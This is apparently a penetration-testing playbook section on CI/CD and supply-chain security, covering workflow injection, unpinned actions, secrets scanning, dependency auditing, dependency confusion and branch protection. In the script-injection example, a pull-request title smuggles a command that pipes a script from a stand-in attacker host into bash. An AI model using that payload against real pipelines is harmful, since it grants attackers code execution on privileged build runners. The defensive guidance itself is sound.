# Playbook 15 — CI/CD and supply chain

**Goal:** find security issues in build pipelines, dependency
management, and the path from source code to deployed artifact.

The CI/CD pipeline is often the highest-privilege thing in the
organization (writes to production, holds cloud credentials). It's
also the most under-tested.

---

## 15.1 Pipeline platform identification

- GitHub Actions (`.github/workflows/`)
- GitLab CI (`.gitlab-ci.yml`)
- CircleCI (`.circleci/config.yml`)
- Jenkins (`Jenkinsfile`)
- AWS CodeBuild / CodePipeline
- Azure DevOps Pipelines
- Bitbucket Pipelines
- Drone, Tekton, ArgoCD

---

## 15.2 Workflow analysis (white-box)

For GitHub Actions specifically (most common):

```bash
find .github/workflows -name '*.yml' -o -name '*.yaml' \
  | xargs cat
```

Findings to look for:

### 15.2.1 Pwn Request / script injection

```yaml
# Vulnerable: user input flows directly into shell
- run: |
    echo "Processing PR: ${{ github.event.pull_request.title }}"
```

Attacker opens PR with title `"; curl evil.com/x.sh | bash; "` and
gets shell on the runner. Mitigation: parameterize with env var,
quote properly.

### 15.2.2 Untrusted code execution

`pull_request_target` events run with secrets and write tokens —
running `actions/checkout` with PR ref grants attacker code
execution as the trusted workflow.

### 15.2.3 Broad token permissions

```yaml
permissions:
  contents: write
  packages: write
  id-token: write
```

Should be narrowed (`contents: read` is the default and best for
most jobs).

### 15.2.4 Self-hosted runner abuse

Self-hosted runners that pick up jobs from public repos / forks
can be hijacked.

### 15.2.5 Unpinned actions

```yaml
- uses: actions/checkout@v4    # vulnerable to tag mutation
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # pinned by SHA
```

Pin by SHA (immutable).

`zizmor` is a SAST tool specifically for GitHub Actions.

---

## 15.3 Secrets in CI/CD

- Secrets in env (`SECRET_KEY: <value>`) committed to repo?
- Secrets printed in logs (echo, debug)?
- Pull-request workflows that have access to repo secrets?
- Forked PR workflows with secrets exposed?
- Long-lived service account / IAM keys vs OIDC federation (use
  OIDC).

```bash
gitleaks detect --source . --report-format json
trufflehog filesystem . --json
```

Run in repo + commit history (secrets often live in old commits).

---

## 15.4 Dependency security

### 15.4.1 Known-vulnerable dependencies

```bash
# Node
npm audit --json
yarn audit --json

# Python
pip-audit -f json
safety check --json

# Ruby
bundler-audit

# PHP
composer audit

# Go
govulncheck ./...

# Rust
cargo audit

# Java (Maven)
mvn dependency-check:check
# or OWASP Dependency-Check directly

# Multi-language SCA
osv-scanner -L composer.lock -L package-lock.json -L Pipfile.lock
syft .          # SBOM generation
grype dir:.     # vuln scan from SBOM
```

Triage:
- Critical / High in production code paths → fix.
- Vulns in dev dependencies → lower priority but fix.
- Transitive vulns → check if your code path actually reaches the
  vulnerable function (often not).

### 15.4.2 Dependency confusion

Internal package name reachable on public registry:
```bash
# If your app has internal package "company-utils"
npm view company-utils    # is it claimed on npmjs.com?
pip show company-utils
```

If unclaimed, attacker registers it and waits for build to pull
from public registry. Mitigation: scoped names, `.npmrc` /
`.pip.conf` pointing only at internal registry, signing.

### 15.4.3 Typosquatting

Common misspellings of popular packages: `requets`, `python-sqlite`
(vs `pysqlite`), `react-native-googl-maps`. Check against installed
deps. `npq` and similar tools detect.

### 15.4.4 SBOM and provenance

- Operator generates an SBOM on build (Syft, CycloneDX)?
- SLSA level achieved (provenance attestation)?
- Reproducible builds?

---

## 15.5 Source repository security

GitHub / GitLab specific:

- **Branch protection** on main / production branches?
- **Required reviews** before merge?
- **Required status checks** (CI must pass)?
- **No force-push to protected branches**?
- **No direct pushes by admins** (admins bypass = audit gap)?
- **2FA required for org members**?
- **Outside collaborators with write access**?
- **Deploy keys** with broader-than-needed scope?
- **Webhook secrets** rotated; not exposed in env?
- **Personal access tokens** with `repo` / `workflow` scope on
  shared accounts?

---

## 15.6 Container build supply chain

- Base images from trusted sources, version-pinned?
- Image-build runs as non-root?
- Build secrets not in image layers (`docker history` reveals
  layers)?
- Final image signed (Cosign)?
- Admission controller verifies signatures?

---

## 15.7 Deploy-time security

- Deploys require approval gate for production?
- Drift detection (someone manually changed a resource)?
- Blast radius of a compromised deploy key (one repo, one project,
  whole org)?
- Auditing of deploy events?

---

## 15.8 Operator's own code repos

If you have access:

- `gitleaks` / `trufflehog` on full history.
- README / wiki for accidentally posted secrets.
- Issues / PR comments for secrets pasted in error.
- CI configs for test credentials that may be production.

---

## 15.9 SAST in CI

If operator has source: enable static analysis as a gate:

- **semgrep** (multi-language, custom rules supportable).
- **CodeQL** (deep, GitHub native).
- **SonarQube** / **Sonar Cloud**.
- **Brakeman** for Ruby on Rails specifically.
- **Bandit** for Python.
- **gosec** for Go.

Run in CI; fail PR on new High / Critical findings.

---

## 15.10 Output

Findings filed. Phase summary:
- Pipeline platform.
- Workflow injection / pwn-request findings.
- Secrets in CI / pipeline.
- Critical / High dependencies.
- Dependency confusion / typosquat candidates.
- Repo / branch protection gaps.
- Build supply chain posture.
